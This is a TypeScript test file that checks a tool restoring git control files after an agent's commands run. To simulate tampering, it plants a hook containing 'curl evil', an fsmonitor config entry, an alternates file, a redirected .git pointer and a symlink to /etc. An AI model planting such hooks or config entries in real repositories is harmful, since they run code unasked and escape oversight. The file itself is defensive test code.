import {
  chmodSync,
  existsSync,
  linkSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readlinkSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { snapshotGitControl } from './git-control';

function repo() {
  const root = mkdtempSync(join(tmpdir(), 'wb-gitctl-'));
  const git = join(root, 'repo.git');
  mkdirSync(join(git, 'hooks'), { recursive: true });
  mkdirSync(join(git, 'info'), { recursive: true });
  mkdirSync(join(git, 'objects', 'info'), { recursive: true });
  mkdirSync(join(git, 'objects', 'ab'), { recursive: true });
  writeFileSync(join(git, 'config'), '[core]\n\tbare = true\n');
  writeFileSync(join(git, 'hooks', 'pre-commit.sample'), '#!/bin/sh\n', { mode: 0o755 });
  writeFileSync(join(git, 'info', 'exclude'), '# nothing\n');
  writeFileSync(join(git, 'objects', 'ab', 'cdef'), 'object');
  const worktree = join(root, 'wt');
  mkdirSync(worktree);
  writeFileSync(join(worktree, '.git'), `gitdir: ${git}/worktrees/wt\n`);
  return { root, git, worktree };
}

describe('git control files (AC-22)', () => {
  it('restores what the agent’s commands changed, planted or replaced, byte for byte', async () => {
    const { git, worktree } = repo();
    const sampleMode = statSync(join(git, 'hooks', 'pre-commit.sample')).mode & 0o777;
    const snap = await snapshotGitControl([git, join(worktree, '.git')]);
    // Planted: a hook, an fsmonitor in the config, an alternates file, a changed .git file, a link instead of info/.
    writeFileSync(join(git, 'hooks', 'post-checkout'), '#!/bin/sh\ncurl evil\n', { mode: 0o755 });
    writeFileSync(join(git, 'config'), '[core]\n\tfsmonitor = /tmp/x\n');
    writeFileSync(join(git, 'objects', 'info', 'alternates'), '/elsewhere/objects\n');
    writeFileSync(join(worktree, '.git'), 'gitdir: /tmp/evil\n');
    chmodSync(join(git, 'hooks', 'pre-commit.sample'), 0o777);
    rmSync(join(git, 'info'), { recursive: true });
    symlinkSync('/etc', join(git, 'info'));
    // Objects are the agent's (commits): untouched.
    writeFileSync(join(git, 'objects', 'ab', 'new'), 'new object');
    expect(await snap.restore()).toEqual([]);
    expect(existsSync(join(git, 'hooks', 'post-checkout'))).toBe(false);
    expect(readFileSync(join(git, 'config'), 'utf8')).toBe('[core]\n\tbare = true\n');
    expect(existsSync(join(git, 'objects', 'info', 'alternates'))).toBe(false);
    expect(readFileSync(join(worktree, '.git'), 'utf8')).toBe(`gitdir: ${git}/worktrees/wt\n`);
    expect(statSync(join(git, 'hooks', 'pre-commit.sample')).mode & 0o777).toBe(sampleMode);
    expect(statSync(join(git, 'info')).isDirectory()).toBe(true);
    expect(readFileSync(join(git, 'info', 'exclude'), 'utf8')).toBe('# nothing\n');
    expect(existsSync('/etc/exclude')).toBe(false);
    expect(readFileSync(join(git, 'objects', 'ab', 'new'), 'utf8')).toBe('new object');
  });

  it('never writes through a hard link a command made', async () => {
    const { root, git } = repo();
    const outside = join(root, 'outside.txt');
    writeFileSync(outside, 'keep me');
    const snap = await snapshotGitControl([git]);
    rmSync(join(git, 'config'));
    linkSync(outside, join(git, 'config'));
    expect(await snap.restore()).toEqual([]);
    expect(readFileSync(outside, 'utf8')).toBe('keep me');
    expect(readFileSync(join(git, 'config'), 'utf8')).toBe('[core]\n\tbare = true\n');
  });

  it('keeps links that were there, and removes a file that wasn’t', async () => {
    const { root, git } = repo();
    symlinkSync('../shared-hooks', join(git, 'hooks', 'linked'));
    const snap = await snapshotGitControl([join(git, 'hooks'), join(root, 'missing-file')]);
    rmSync(join(git, 'hooks', 'linked'));
    writeFileSync(join(root, 'missing-file'), 'x');
    expect(await snap.restore()).toEqual([]);
    expect(readlinkSync(join(git, 'hooks', 'linked'))).toBe('../shared-hooks');
    expect(existsSync(join(root, 'missing-file'))).toBe(false);
  });
});
